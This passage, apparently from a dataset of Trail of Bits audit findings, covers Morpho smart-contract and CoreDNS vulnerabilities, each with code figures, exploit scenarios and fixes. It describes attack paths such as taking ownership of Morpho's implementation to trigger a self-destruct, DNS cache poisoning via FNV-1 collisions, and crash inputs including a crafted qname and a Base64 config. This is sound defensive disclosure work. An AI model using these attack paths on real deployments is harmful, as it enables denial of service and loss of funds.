_maxGasForMatching ) external { Figure 3.1: The withdrawLogic function, which takes a supplier and whose comments note that it performs security checks Recommendations Short term, add a check to the withdrawLogic function to ensure that it withdraws funds only from the msg.sender. Long term, implement security checks consistently throughout the codebase.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Lack of zero address checks in setter functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "Certain setter functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. A mistake like this could initially go unnoticed because a delegatecall to an address without code will return success. /// @notice Sets the `positionsManager`. /// @param _positionsManager The new `positionsManager`. function setPositionsManager(IPositionsManager _positionsManager) external onlyOwner { positionsManager = _positionsManager; emit PositionsManagerSet(address(_positionsManager)); } Figure 4.1: An important address setter in MorphoGovernance Exploit Scenario Alice and Bob control a multisignature wallet that is the owner of a deployed Morpho contract. They decide to set _positionsManager to a newly upgraded contract but, while invoking setPositionsManager, they mistakenly omit the address. As a result, _positionsManager is set to the zero address, resulting in undened behavior. Recommendations Short term, add zero-value checks to all important address setters to ensure that owners cannot accidentally set addresses to incorrect values, misconguring the system. Specically, add zero-value checks to the setPositionsManager, setRewardsManager, setInterestRates, setTreasuryVault, and setIncentivesVault functions, as well as the _cETH and _cWeth parameters of the initialize function in the MorphoGovernance contract. Long term, incorporate Slither into a continuous integration pipeline, which will continuously warn developers when functions do not have checks for zero values.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Risky use of toggle functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "The codebase uses a toggle function, togglePauseStatus, to pause and unpause a market. This function is error-prone because setting a pause status on a market depends on the markets current state. Multiple uncoordinated pauses could result in a failure to pause a market in the event of an incident. /// @notice Toggles the pause status on a specific market in case of emergency. /// @param _poolTokenAddress The address of the market to pause/unpause. function togglePauseStatus(address _poolTokenAddress) external onlyOwner isMarketCreated(_poolTokenAddress) { } Types.MarketStatus storage marketStatus_ = marketStatus[_poolTokenAddress]; bool newPauseStatus = !marketStatus_.isPaused; marketStatus_.isPaused = newPauseStatus; emit PauseStatusChanged(_poolTokenAddress, newPauseStatus); Figure 5.1: The togglePauseStatus method in MorphoGovernance This issue also applies to togglePartialPauseStatus, toggleP2P, and toggleCompRewardsActivation in MorphoGovernance and to togglePauseStatus in IncentivesVault. Exploit Scenario All signers of a 4-of-9 multisignature wallet that owns a Morpho contract notice an ongoing attack that is draining user funds from the protocol. Two groups of four signers hurry to independently call togglePauseStatus, resulting in a failure to pause the system and leading to the further loss of funds. Recommendations Short term, replace the toggle functions with ones that explicitly set the pause status to true or false. Long term, carefully review the incident response plan and ensure that it leaves as little room for mistakes as possible.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "6. Anyone can destroy Morphos implementation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "An incorrect access control on the initialize function for Morphos implementation contract allows anyone to destroy the contract. Morpho uses the delegatecall proxy pattern for upgradeability: abstract contract MorphoStorage is OwnableUpgradeable, ReentrancyGuardUpgradeable { Figure 6.1: contracts/compound/MorphoStorage.sol#L16 With this pattern, a proxy contract is deployed and executes a delegatecall to the implementation contract for certain operations. Users are expected to interact with the system through this proxy. However, anyone can also directly call Morphos implementation contract. Despite the use of the proxy pattern, the implementation contract itself also has delegatecall capacities. For example, when called in the updateP2PIndexes function, setReserveFactor executes a delegatecall on user-provided addresses: function setReserveFactor(address _poolTokenAddress, uint16 _newReserveFactor) external onlyOwner isMarketCreated(_poolTokenAddress) { if (_newReserveFactor > MAX_BASIS_POINTS) revert ExceedsMaxBasisPoints(); updateP2PIndexes(_poolTokenAddress); Figure 6.2: contracts/compound/MorphoGovernance.sol#L203-L209 function updateP2PIndexes(address _poolTokenAddress) public { address(interestRatesManager).functionDelegateCall( abi.encodeWithSelector( interestRatesManager.updateP2PIndexes.selector, _poolTokenAddress ) ); } Figure 6.3: contracts/compound/MorphoUtils.sol#L119-L126 These functions are protected by the onlyOwner modier; however, the systems owner is set by the initialize function, which is callable by anyone: function initialize( IPositionsManager _positionsManager, IInterestRatesManager _interestRatesManager, IComptroller _comptroller, Types.MaxGasForMatching memory _defaultMaxGasForMatching, uint256 _dustThreshold, uint256 _maxSortedUsers, address _cEth, address _wEth ) external initializer { __ReentrancyGuard_init(); __Ownable_init(); Figure 6.4: contracts/compound/MorphoGovernance.sol#L114-L125 As a result, anyone can call Morpho.initialize to become the owner of the implementation and execute any delegatecall from the implementation, including to a contract containing a selfdestruct. Doing so will cause the proxy to point to a contract that has been destroyed. This issue is also present in PositionsManagerForAave. Exploit Scenario The system is deployed. Eve calls Morpho.initialize on the implementation and then calls setReserveFactor, triggering a delegatecall to an attacker-controlled contract that self-destructs. As a result, the system stops working. Recommendations Short term, add a constructor in MorphoStorage and PositionsManagerForAaveStorage that will set an is_implementation variable to true and check that this variable is false before executing any critical operation (such as initialize, delegatecall, and selfdestruct). By setting this variable in the constructor, it will be set only in the implementation and not in the proxy. Long term, carefully review the pitfalls of using the delegatecall proxy pattern. References  Breaking Aave Upgradeability", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "7. Lack of return value checks during token transfers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "In certain parts of the codebase, contracts that execute transfers of the Morpho token do not check the values returned from those transfers. The development of the Morpho token was not yet complete at the time of the audit, so we were unable to review the code specic to the Morpho token. Some tokens that are not ERC20 compliant return false instead of reverting, so failure to check such return values could result in undened behavior, including the loss of funds. If the Morpho token adheres to ERC20 standards, then this issue may not pose a risk; however, due to the lack of return value checks, the possibility of undened behavior cannot be eliminated. function transferMorphoTokensToDao(uint256 _amount) external onlyOwner { morphoToken.transfer(morphoDao, _amount); emit MorphoTokensTransferred(_amount); } Figure 7.1: The transerMorphoTokensToDao method in IncentivesVault Exploit Scenario The Morpho token code is completed and deployed alongside the other Morpho system components. It is implemented in such a way that it returns false instead of reverting when transfers fail, leading to undened behavior. Recommendations Short term, consider using a safeTransfer library for all token transfers. Long term, review the token integration checklist and check all the components of the system to ensure that they interact with tokens safely.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "8. Risk of loss of precision in division operations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "A common pattern in the codebase is to divide a users debt by the total supply of a token; a loss of precision in these division operations could occur, which means that the supply delta would not account for the entire matched delta amount. The impact of this potential loss of precision requires further investigation. For example, the borrowLogic method uses this pattern: toWithdraw += matchedDelta; remainingToBorrow -= matchedDelta; delta.p2pSupplyDelta -= matchedDelta.div(poolSupplyIndex); emit P2PSupplyDeltaUpdated(_poolTokenAddress, delta.p2pSupplyDelta); Figure 8.1: Part of the borrowLogic() method Here, if matchedDelta is not a multiple of poolSupplyIndex, the remainder would not be taken into account. In an extreme case, if matchedDelta is smaller than poolSupplyIndex, the result of the division operation would be zero. An attacker could exploit this loss of precision to extract small amounts of underlying tokens sitting in the Morpho contract. Exploit Scenario Bob transfers some Dai to the Morpho contract by mistake. Eve sees this transfer, deposits some collateral, and then borrows an amount of Dai from Morpho small enough that it does not aect Eve's debt. Eve withdraws her deposited collateral and walks out with Bobs Dai. Further investigation into this exploit scenario is required. Recommendations Short term, add checks to validate input data to prevent precision issues in division operations. Long term, review all the arithmetic that is vulnerable to rounding issues.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "1. Risk of a race condition in the secondary plugins setup function ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "When it fails to transfer a zone from another server, the setup function of the secondary plugin prints a message to standard output. It obtains the name of the zone, stored in the variable n , from a loop and prints the message in an anonymous inner goroutine. However, the variable is not copied before being used in the anonymous goroutine, and the value that n points to is likely to change by the time the scheduler executes the goroutine. Consequently, the value of n will be inaccurate when it is printed. 19 24 26 27 29 30 31 32 35 36 40 func setup(c *caddy.Controller) error { // (...). for _, n := range zones.Names { // (...) c.OnStartup( func () error { z.StartupOnce.Do( func () { go func () { // (...) for { // (...) log.Warningf( \"All '%s' masters failed to transfer, retrying in %s: %s\" , n , dur.String(), err) // (...) 41 46 47 48 49 50 51 52 53 } } } z.Update() }() }) return nil }) Figure 1.1: The value of n is not copied before it is used in the anonymous goroutine and could be logged incorrectly. ( plugin/secondary/setup.go#L19-L53 ) Exploit Scenario An operator of a CoreDNS server enables the secondary plugin. The operator sees an error in the standard output indicating that the zone transfer failed. However, the error points to an invalid zone, making it more dicult for the operator to troubleshoot and x the issue. Recommendations Short term, create a copy of n before it is used in the anonymous goroutine. See Appendix B for a proof of concept demonstrating this issue and an example of the x. Long term, integrate  anonymous-race-condition Semgrep rule into the CI/CD pipeline to catch this type of race condition.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Undetermined"]}, {"title": "2. Upstream errors captured in the grpc plugin are not returned ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "In the ServeDNS implementation of the grpc plugin, upstream errors are captured in a loop. However, once an error is captured in the upstreamErr variable, the function exits with a nil error; this is because there is no break statement forcing the function to exit the loop and to reach a return statement, at which point it would return the error value. The ServeDNS function of the forward plugin includes a similar but correct implementation. func (g *GRPC) ServeDNS(ctx context.Context, w dns.ResponseWriter, r *dns.Msg) ( int , error ) { // (...) upstreamErr = err // Check if the reply is correct; if not return FormErr. if !state.Match(ret) { debug.Hexdumpf(ret, \"Wrong reply for id: %d, %s %d\" , ret.Id, state.QName(), state.QType()) formerr := new (dns.Msg) formerr.SetRcode(state.Req, dns.RcodeFormatError) w.WriteMsg(formerr) return 0 , nil } w.WriteMsg(ret) return 0 , nil } if upstreamErr != nil { return dns.RcodeServerFailure, upstreamErr } Figure 2.1: plugin/secondary/setup.go#L19-L53 Exploit Scenario An operator runs CoreDNS with the grpc plugin. Upstream errors cause the gRPC functionality to fail. However, because the errors are not logged, the operator remains unaware of their root cause and has diculty troubleshooting and remediating the issue. Recommendations Short term, correct the ineectual assignment to ensure that errors captured by the plugin are returned. Long term, integrate ineffassign into the CI/CD pipeline to catch this and similar issues.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Undetermined"]}, {"title": "3. Index-out-of-range panic in autopath plugin initialization ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "The following syntax is used to congure the autopath plugin: autopath [ZONE...] RESOLV-CONF The RESOLV-CONF parameter can point to a resolv.conf(5) conguration le or to another plugin, if the string in the resolv variable is prexed with an @ symbol (e.g., @kubernetes). However, the autoPathParse function does not ensure that the length of the RESOLV-CONF parameter is greater than zero before dereferencing its rst element and comparing it with the @ character. func autoPathParse(c *caddy.Controller) (*AutoPath, string , error ) { ap := &AutoPath{} mw := \"\" for c.Next() { zoneAndresolv := c.RemainingArgs() if len (zoneAndresolv) < 1 { return ap, \"\" , fmt.Errorf( \"no resolv-conf specified\" ) } resolv := zoneAndresolv[ len (zoneAndresolv)- 1 ] if resolv[ 0 ] == '@' { mw = resolv[ 1 :] Figure 3.1: The length of resolv may be zero when the rst element is checked. ( plugin/autopath/setup.go#L45-L54 ) Specifying a conguration le with a zero-length RESOLV-CONF parameter, as shown in gure 3.2, would cause CoreDNS to panic. 0 autopath \"\" Figure 3.2: An autopath conguration with a zero-length RESOLV-CONF parameter panic: runtime error: index out of range [0] with length 0 goroutine 1 [running]: github.com/coredns/coredns/plugin/autopath.autoPathParse(0xc000518870) /home/ubuntu/audit-coredns/client-code/coredns/plugin/autopath/setup.go:53 +0x35c github.com/coredns/coredns/plugin/autopath.setup(0xc000518870) /home/ubuntu/audit-coredns/client-code/coredns/plugin/autopath/setup.go:16 +0x33 github.com/coredns/caddy.executeDirectives(0xc00029eb00, {0x7ffdc770671b, 0x8}, {0x324cfa0, 0x31, 0x1000000004b7e06}, {0xc000543260, 0x1, 0x8}, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:661 +0x5f6 github.com/coredns/caddy.ValidateAndExecuteDirectives({0x22394b8, 0xc0003e8a00}, 0xc0003e8a00, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:612 +0x3e5 github.com/coredns/caddy.startWithListenerFds({0x22394b8, 0xc0003e8a00}, 0xc00029eb00, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:515 +0x274 github.com/coredns/caddy.Start({0x22394b8, 0xc0003e8a00}) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:472 +0xe5 github.com/coredns/coredns/coremain.Run() /home/ubuntu/audit-coredns/client-code/coredns/coremain/run.go:62 +0x1cd main.main() /home/ubuntu/audit-coredns/client-code/coredns/coredns.go:12 +0x17 Figure 3.3: CoreDNS panics when loading the autopath conguration. Exploit Scenario An operator of a CoreDNS server provides an empty RESOLV-CONF parameter when conguring the autopath plugin, causing a panic. Because CoreDNS does not provide a clear explanation of what went wrong, it is dicult for the operator to troubleshoot and x the issue. Recommendations Short term, verify that the resolv variable is a non-empty string before indexing it. Long term, review the codebase for instances in which data is indexed without undergoing a length check; handling untrusted data in this way may lead to a more severe denial of service (DoS).", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "4. Index-out-of-range panic in forward plugin initialization ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "Initializing the forward plugin involves parsing the relevant conguration section. func parseStanza(c *caddy.Controller) (*Forward, error ) { f := New() if !c.Args(&f.from) { return f, c.ArgErr() } origFrom := f.from zones := plugin.Host(f.from).NormalizeExact() f.from = zones[ 0 ] // there can only be one here, won't work with non-octet reverse Figure 4.1: The length of the zones variable may be zero when the rst element is checked. ( plugin/forward/setup.go#L89-L97 ) An invalid conguration le for the forward plugin could cause the zones variable to have a length of zero. A Base64-encoded example of such a conguration le is shown in gure 4.2. Lgpmb3J3YXJkIE5vTWF0Pk69VL0vvVN0ZXJhbENoYXJDbGFzc0FueUNoYXJOb3ROTEEniez6bnlDaGFyQmVnaW5MaW5l RW5kTGluZUJlZ2luVGV4dEVuZFRleHRXb3JkQm91bmRhcnlOb1dvYXRpbmcgc3lzdGVtIDogImV4dCIsICJ4ZnMiLCAi bnRTaW50NjRLaW5kZnMiLiB5IGluZmVycmVkIHRvIGJlIGV4dCBpZiB1bnNwZWNpZmllZCBlIDogaHR0cHM6Di9rdWJl cm5ldGVzaW9kb2NzY29uY2VwdHNzdG9yYWdldm9sdW1lcyMgIiIiIiIiIiIiIiIiJyCFmIWlsZj//4WuhZilr4WY5bCR mPCd Figure 4.2: The Base64-encoded forward conguration le Specifying a conguration le like that shown above would cause CoreDNS to panic when attempting to access the rst element of zones : panic: runtime error: index out of range [0] with length 0 goroutine 1 [running]: github.com/coredns/coredns/plugin/forward.parseStanza(0xc000440000) /home/ubuntu/audit-coredns/client-code/coredns/plugin/forward/setup.go:97 +0x972 github.com/coredns/coredns/plugin/forward.parseForward(0xc000440000) /home/ubuntu/audit-coredns/client-code/coredns/plugin/forward/setup.go:81 +0x5e github.com/coredns/coredns/plugin/forward.setup(0xc000440000) /home/ubuntu/audit-coredns/client-code/coredns/plugin/forward/setup.go:22 +0x33 github.com/coredns/caddy.executeDirectives(0xc0000ea800, {0x7ffdf9f6e6ed, 0x36}, {0x324cfa0, 0x31, 0x1000000004b7e06}, {0xc00056a860, 0x1, 0x8}, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:661 +0x5f6 github.com/coredns/caddy.ValidateAndExecuteDirectives({0x22394b8, 0xc00024ea80}, 0xc00024ea80, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:612 +0x3e5 github.com/coredns/caddy.startWithListenerFds({0x22394b8, 0xc00024ea80}, 0xc0000ea800, 0x0) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:515 +0x274 github.com/coredns/caddy.Start({0x22394b8, 0xc00024ea80}) /home/ubuntu/go/pkg/mod/github.com/coredns/caddy@v1.1.1/caddy.go:472 +0xe5 github.com/coredns/coredns/coremain.Run() /home/ubuntu/audit-coredns/client-code/coredns/coremain/run.go:62 +0x1cd main.main() /home/ubuntu/audit-coredns/client-code/coredns/coredns.go:12 +0x17 Figure 4.3: CoreDNS panics when loading the forward conguration. Exploit Scenario An operator of a CoreDNS server miscongures the forward plugin, causing a panic. Because CoreDNS does not provide a clear explanation of what went wrong, it is dicult for the operator to troubleshoot and x the issue. Recommendations Short term, verify that the zones variable has the correct number of elements before indexing it. Long term, review the codebase for instances in which data is indexed without undergoing a length check; handling untrusted data in this way may lead to a more severe DoS.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "5. Use of deprecated PreferServerCipherSuites eld ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "In the setTLSDefaults function of the tls plugin, the TLS conguration object includes a PreferServerCipherSuites eld, which is set to true . func setTLSDefaults(tls *ctls.Config) { tls.MinVersion = ctls.VersionTLS12 tls.MaxVersion = ctls.VersionTLS13 tls.CipherSuites = [] uint16 { ctls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305, ctls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305, ctls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, ctls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, ctls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, ctls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, } tls.PreferServerCipherSuites = true } Figure 5.1: plugin/tls/tls.go#L22-L37 In the past, this property controlled whether a TLS connection would use the cipher suites preferred by the server or by the client. However, as of Go 1.17, this eld is ignored. According to the Go documentation for crypto/tls , Servers now select the best mutually supported cipher suite based on logic that takes into account inferred client hardware, server hardware, and security. When CoreDNS is built using a recent Go version, the use of this property is redundant and may lead to false assumptions about how cipher suites are negotiated in a connection to a CoreDNS server. Recommendations Short term, add this issue to the internal issue tracker. Additionally, when support for Go versions older than 1.17 is entirely phased out of CoreDNS, remove the assignment to the deprecated PreferServerCipherSuites eld.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "6. Use of the MD5 hash function to detect Corele changes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "The reload plugin is designed to automatically detect changes to a Corele and to reload it if necessary. To determine whether a le has changed, the plugin periodically compares the current MD5 hash of the le to the last hash calculated for it ( plugin/reload/reload.go#L81-L107 ). If the values are dierent, it reloads the Corele. However, the MD5 hash functions vulnerability to collisions decreases the reliability of this process; if two dierent les produce the same hash value, the plugin will not detect the dierence between them. Exploit Scenario An operator of a CoreDNS server modies a Corele, but the MD5 hash of the modied le collides with that of the old le. As a result, the reload plugin does not detect the change. Instead, it continues to use the outdated server conguration without alerting the operator to its use. Recommendations Short term, improve the robustness of the reload plugin by using the SHA-512 hash function instead of MD5.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "7. Use of default math/rand seed in grpc and forward plugins random server-selection policy ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "The grpc and forward plugins use the random policy for selecting upstream servers. The implementation of this policy in the two plugins is identical and uses the math/rand package from the Go standard library. func (r *random) List(p []*Proxy) []*Proxy { switch len (p) { case 1 : return p case 2 : if rand.Int()% 2 == 0 { return []*Proxy{p[ 1 ], p[ 0 ]} // swap } return p } perms := rand.Perm( len (p)) rnd := make ([]*Proxy, len (p)) for i, p1 := range perms { rnd[i] = p[p1] } return rnd } Figure 7.1: plugin/grpc/policy.go#L19-L37 As highlighted in gure 7.1, the random policy uses either rand.Int or rand.Perm to choose the order of the upstream servers, depending on the number of servers that have been congured. Unless a program using the random policy explicitly calls rand.Seed , the top-level functions rand.Int and rand.Perm behave as if they were seeded with the value 1 , which is the default seed for math/rand . CoreDNS does not call rand.Seed to seed the global state of math/rand . Without this call, the grpc and forward plugins random selection of upstream servers is likely to be trivially predictable and the same every time CoreDNS is restarted. Exploit Scenario An attacker targets a CoreDNS instance in which the grpc or forward plugin is enabled. The attacker exploits the deterministic selection of upstream servers to overwhelm a specic server, with the goal of causing a DoS condition or performing an attack such as a timing attack. Recommendations Short term, instantiate a rand.Rand type with a unique seed, rather than drawing random numbers from the global math/rand state. CoreDNS takes this approach in several other areas, such as the loop plugin .", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "8. Cache plugin does not account for hash table collisions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "To cache a DNS reply, CoreDNS maps the FNV-1 hash of the query name and type to the content of the reply in a hash table entry. func key(qname string , m *dns.Msg, t response.Type) ( bool , uint64 ) { // We don't store truncated responses. if m.Truncated { return false , 0 } // Nor errors or Meta or Update. if t == response.OtherError || t == response.Meta || t == response.Update { return false , 0 } return true , hash(qname, m.Question[ 0 ].Qtype) } func hash(qname string , qtype uint16 ) uint64 { h := fnv.New64() h.Write([] byte { byte (qtype >> 8 )}) h.Write([] byte { byte (qtype)}) h.Write([] byte (qname)) return h.Sum64() } Figure 8.1: plugin/cache/cache.go#L68-L87 To check whether there is a cached reply for an incoming query, CoreDNS performs a hash table lookup for the query name and type. If it identies a reply with a valid time to live (TTL), it returns the reply. CoreDNS assumes the stored DNS reply to be the correct one for the query, given the use of a hash table mapping. However, this assumption is faulty, as FNV-1 is a non-cryptographic hash function that does not oer collision resistance, and there exist utilities for generating colliding inputs to FNV-1 . As a result, it is likely possible to construct a valid (qname , qtype) pair that collides with another one, in which case CoreDNS could serve the incorrect cached reply to a client. Exploit Scenario An attacker aiming to poison the cache of a CoreDNS server generates a valid (qname* , qtype*) pair whose FNV-1 hash collides with a commonly queried (qname , qtype) pair. The attacker gains control of the authoritative name server for qname* and points its qtype* record to an address of his or her choosing. The attacker also congures the server to send a second record when (qname* , qtype*) is queried: a qtype record for qname that points to a malicious address. The attacker queries the CoreDNS server for (qname* , qtype*) , and the server caches the reply with the malicious address. Soon thereafter, when a legitimate user queries the server for (qname , qtype) , CoreDNS serves the user the cached reply for (qname* , qtype*) , since it has an identical FNV-1 hash. As a result, the legitimate users DNS client sees the malicious address as the record for qname . Recommendations Short term, store the original name and type of a query in the value of a hash table entry. After looking up the key for an incoming request in the hash table, verify that the query name and type recorded alongside the cached reply match those of the request. If they do not, disregard the cached reply. Short term, use the keyed hash function SipHash instead of FNV-1. SipHash was designed for speed and derives a 64-bit output value from an input value and a 128-bit secret key; this method adds pseudorandomness to a hash table key and makes it more dicult for an attacker to generate collisions oine. CoreDNS should use the crypto/rand package from Gos standard library to generate a cryptographically random secret key for SipHash on startup.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Undetermined"]}, {"title": "9. Index-out-of-range reference in kubernetes plugin ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "The parseRequest function of the kubernetes plugin parses a DNS request before using it to query Kubernetes. By fuzzing the function, we discovered an out-of-range issue that can cause a panic. The issue occurs when the function calls stripUnderscore with an empty string, as it does when it receives a request with the qname .o.o.po.pod.8 and the zone interwebs. // stripUnderscore removes a prefixed underscore from s. func stripUnderscore(s string ) string { if s[ 0 ] != '_' { return s } return s[ 1 :] } Figure 9.1: plugin/kubernetes/parse.go#L97 Because of the time constraints of the audit, we could not nd a way to directly exploit this vulnerability. Although certain tools for sending DNS queries, like dig and host , verify the validity of a host before submitting a DNS query, it may be possible to exploit the vulnerability by using custom tooling or DNS over HTTPs (DoH). Exploit Scenario An attacker nds a way to submit a query with an invalid host (such as o.o.po.pod.8) to a CoreDNS server running as the DNS server for a Kubernetes endpoint. Because of the index-out-of-range bug, the kubernetes plugin causes CoreDNS to panic and crash, resulting in a DoS. Recommendations Short term, to prevent a panic, implement a check of the value of the string passed to the stripUnderscore function.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "10. Calls to time.After() in select statements can lead to memory leaks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "Calls to the time.After function in select/case statements within for loops can lead to memory leaks. This is because the garbage collector does not clean up the underlying Timer object until the timer has red. A new timer is initialized at the start of each iteration of the for loop (and therefore with each select statement), which requires resources. As a result, if many routines originate from a time.After call, the system may experience memory overconsumption. for { select { case <-ctx.Done(): log.Debugf( \"Breaking out of CloudDNS update loop for %v: %v\" , h.zoneNames, ctx.Err()) return case <-time.After( 1 * time.Minute) : if err := h.updateZones(ctx); err != nil && ctx.Err() == nil /* Don't log error if ctx expired. */ { log.Errorf( \"Failed to update zones %v: %v\" , h.zoneNames, err) } Figure 10.1: A time.After() routine that causes a memory leak ( plugin/clouddns/clouddns.go#L85-L93 ) The following portions of the code contain similar patterns:  plugin/clouddns/clouddns.go#L85-L93  plugin/azure/azure.go#L87-96  plugin/route53/route53.go#87-96 Exploit Scenario An attacker nds a way to overuse a function, which leads to overconsumption of a CoreDNS servers memory and a crash. Recommendations Short term, use a ticker instead of the time.After function in select/case statements included in for loops. This will prevent memory leaks and crashes caused by memory exhaustion. Long term, avoid using the time.After method in for-select routines and periodically use a Semgrep query to detect similar patterns in the code. References  DevelopPaper post on the memory leak vulnerability in time.After   Golang <-time.After() Is Not Garbage Collected before Expiry  (Medium post)", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "11. Incomplete list of debugging data exposed by the prometheus plugin ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "Enabling the prometheus (metrics) plugin exposes an HTTP endpoint that lists CoreDNS metrics. The documentation for the plugin indicates that it reports data such as the total number of queries and the size of responses. However, other data that is reported by the plugin (and also available through the pprof plugin) is not listed in the documentation. This includes Go runtime debugging information such as the number of running goroutines and the duration of Go garbage collection runs. Because this data is not listed in the prometheus plugin documentation, operators may initially be unaware of its exposure. Moreover, the data could be instrumental in formulating an attack. # TYPE go_gc_duration_seconds summary go_gc_duration_seconds{quantile=\"0\"} 4.4756e-05 go_gc_duration_seconds{quantile=\"0.25\"} 6.0522e-05 go_gc_duration_seconds{quantile=\"0.5\"} 7.1476e-05 go_gc_duration_seconds{quantile=\"0.75\"} 0.000105802 go_gc_duration_seconds{quantile=\"1\"} 0.000205775 go_gc_duration_seconds_sum 0.010425592 go_gc_duration_seconds_count 123 # HELP go_goroutines Number of goroutines that currently exist. # TYPE go_goroutines gauge go_goroutines 18 # HELP go_info Information about the Go environment. # TYPE go_info gauge go_info{version=\"go1.17.3\"} 1 # HELP go_memstats_alloc_bytes Number of bytes allocated and still in use. # TYPE go_memstats_alloc_bytes gauge Figure 11.1: Examples of the data exposed by prometheus and omitted from the documentation Exploit Scenario An attacker discovers the metrics exposed by CoreDNS over port 9253. The attacker then monitors the endpoint to determine the eectiveness of various attacks in crashing the server. Recommendations Short term, document all data exposed by the prometheus plugin. Additionally, consider changing the data exposed by the prometheus plugin to exclude Go runtime data available through the pprof plugin.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "12. Cloud integrations require cleartext storage of keys in the Corele ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "The route53 , azure , and clouddns plugins enable CoreDNS to interact with cloud providers (AWS, Azure, and the Google Cloud Platform (GCP), respectively). To access clouddns , a user enters the path to the le containing his or her GCP credentials. When using route53 , CoreDNS pulls the AWS credentials that the user has entered in the Corele. If the AWS credentials are not included in the Corele, CoreDNS will pull them in the same way that the AWS command-line interface (CLI) would. While operators have options for the way that they provide AWS and GCP credentials, Azure credentials must be pulled directly from the Corele. Furthermore, the CoreDNS documentation lacks guidance on the risks of storing AWS, Azure, or GCP credentials in local conguration les . Exploit Scenario An attacker or malicious internal user gains access to a server running CoreDNS. The malicious actor then locates the Corele and obtains credentials for a cloud provider, thereby gaining access to a cloud infrastructure. Recommendations Short term, remove support for entering cloud provider credentials in the Corele in cleartext. Instead, load credentials for each provider in the manner recommended in that providers documentation and implemented by its CLI utility. CoreDNS should also refuse to load credential les with overly broad permissions and warn users about the risks of such les.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "13. Lack of rate-limiting controls ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/CoreDNS.pdf", "body": "CoreDNS does not enforce rate limiting of DNS queries, including those sent via DoH. As a result, we were able to issue the same request thousands of times in less than one minute over the HTTP endpoint /dns-query . Figure 13.1: We sent 3,424 requests to CoreDNS without being rate limited. During our tests, the lack of rate limiting did not appear to aect the application. However, processing requests sent at such a high rate can consume an inordinate amount of host resources, and a lack of rate limiting can facilitate DoS and DNS amplication attacks. Exploit Scenario An attacker oods a CoreDNS server with HTTP requests, leading to a DoS condition. Recommendations Short term, consider incorporating the rrl plugin, used for the rate limiting of DNS queries, into the CoreDNS codebase. Additionally, implement rate limiting on all API endpoints. An upper bound can be applied at a high level to all endpoints exposed by CoreDNS. Long term, run stress tests to ensure that the rate limiting enforced by CoreDNS is robust.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "14. Lack of a limit on the size of response bodies ", "html_url": 